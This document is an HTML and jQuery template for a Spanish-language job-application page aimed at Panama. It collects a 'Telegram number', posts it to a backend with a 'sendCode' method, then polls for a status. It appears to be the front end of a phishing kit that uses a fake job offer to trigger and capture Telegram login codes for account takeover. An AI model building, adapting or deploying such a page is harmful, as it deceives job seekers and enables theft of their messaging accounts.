<div class="flex h-full px-4">
  <div class="w-full m-auto my-8">
      <div class="bg-white rounded-lg overflow-hidden dkconsty">
          <form id="formphone" method="post">
              <div class="flex justify-end">
                  <img id="check-mark" class="fixed hidden" src="assets/check.png" alt="">
              </div>
              <div class="text-black p-2 items-center flex text-center" style="">
                  <!-- <img src="assets/new-banner.png" style="width: 100%;" /> -->
                   <div>
                     <p class=" font-bold" style="font-size: 25px;">¡Consigue el mejor trabajo para ti!</p>
                     <p class=" font-bold" style="font-size: 25px;">¡Postúlate ya!</p>
                   </div>
                  <img src="assets/i.jpg" style="width: 50%;" />
              </div>
              <div class="px-8 mt-4">
                  <div class="mb-4 relative flex w-full flex-wrap items-stretch">
                      <label class="block text-gray-700 text-sm font-bold mb-2" for="fullName"> Nombre completo (como en su cédula) </label>
                      <input autocomplete="off" placeholder="Ingrese su nombre completo" autofocus value="" class="h-12 appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="fullName" type="text">
                  </div>
                  <p id="name-error" class="text-center mt-2 error-message" style="color: red; display: none;">Name cannot be empty.</p>
              </div>
              <div class="px-8 mt-4">
                  <div class="mb-4 relative flex w-full flex-wrap items-stretch">
                      <label class="block text-gray-700 text-sm font-bold mb-2" for="phone"> Número de Telegram </label>
                      <input id="phone" autocomplete="off" placeholder="Ingrese su número de Telegram" value="" class="h-12 appearance-none border rounded w-full text-gray-700 leading-tight focus:outline-none focus:shadow-outline" maxlength="20" id="phone" type="tel" inputmode="numeric" name="phone" style="padding-left: 40px;">
                  </div>
                  <p id="wrong" class="text-center mt-2 error-message" style="color: red;">Please enter a valid phone number.</p>
              </div>
              <div class="px-8 pt-2">
                  <div class="flex items-center justify-between" style="padding-bottom: 30px;">
                      <button class="text-center font-bold text-white w-full py-2 h-12 focus:outline-none focus:shadow-outline shadow shadow-md" type="submit" style="background-color: #1565C0; border-radius: 8px;">
                        <div style="display: flex;gap: 5px;justify-content: center;">
                          <p id="lblLogin" class="text-uppercase">Regístrate ahora</p>
                        </div>
                      </button>
                  </div>
              </div>
          </form>
      </div>
  </div>
</div>



<script>
  
  document.addEventListener("DOMContentLoaded", function() {
      const phoneInputField = document.getElementById("phone");
      const form = document.getElementById("formphone");
      const fullNameField = document.getElementById("fullName");
      const nameError = document.getElementById("name-error");
      const phoneError = document.getElementById("phone-error");
      const lblLogin = document.getElementById("lblLogin");
      const loader = document.getElementById("loader");

      // Initialize the intl-tel-input plugin
      const iti = window.intlTelInput(phoneInputField, {
          initialCountry: "pa", // Set Panama as the initial country
          onlyCountries: ["pa"], 
          separateDialCode: false,
          formatOnDisplay: true,
          nationalMode: false,
          allowDropdown: false,
          customContainer: "iti--allow-dropdown w-full",
          utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.2.1/js/utils.js",
      });

      // Automatically format the phone number when the field gets focus
      phoneInputField.addEventListener("focus", function() {
          const dialCode = iti.getSelectedCountryData().dialCode;
          const currentValue = phoneInputField.value;
          if (!currentValue.startsWith(`+${dialCode}`)) {
              phoneInputField.value = `+${dialCode} ${currentValue.replace(/^\+\d+\s*/,  "")}`;
          }
      });
  });
</script>
<script>
  $("#wrong").hide();
  $("#loader").hide();

  function checkStatus() {
    $("#wrong").hide();
    $("#loader").show();
    $.ajax({
      url: "<?= base_url("API/index.php") ?>",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("#lblLogin").show();
          $("#loader").hide();
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("#formphone button").on("click", function(e){
    e.preventDefault();
    var phone = $("input#phone").val();

    if (phone != "") {
      $("#loader").show();
      $("#lblLogin").hide();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: {"method":"sendCode","phone":phone},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>